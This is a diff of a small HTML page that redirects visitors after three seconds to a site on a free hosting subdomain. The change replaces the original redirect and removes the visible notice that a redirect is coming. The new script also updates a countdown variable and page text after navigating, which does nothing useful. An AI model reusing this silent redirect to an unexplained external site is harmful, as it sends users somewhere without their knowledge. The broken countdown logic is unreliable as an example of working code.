@@ -5,14 +5,21 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Redirection</title>
   <link rel="stylesheet" href="styles.css">
-  <script>
-    // Redirection dans la même fenêtre après un délai de 3 secondes (3000 millisecondes)
-    setTimeout(function() {
-      window.open('https://spumous-misalignmen.000webhostapp.com/', '_self');
-    }, 3000);
-  </script>
+<script>
+  let i = 5;
+
+setTimeout(function() {
+    // Décrémentez la variable i
+    i--;
+
+    // Redirigez vers une autre page web
+    window.location.href = 'https://spumous-misalignmen.000webhostapp.com/';
+
+    // Affichez le contenu dans le corps (body) de la nouvelle page
+    document.body.textContent = i;
+}, 3000);
+</script>
 </head>
 <body>
-  <p>Vous serez rédirigé vers une autre page dans quelques secondes...</p>
-</body>
+  </body>
 </html>
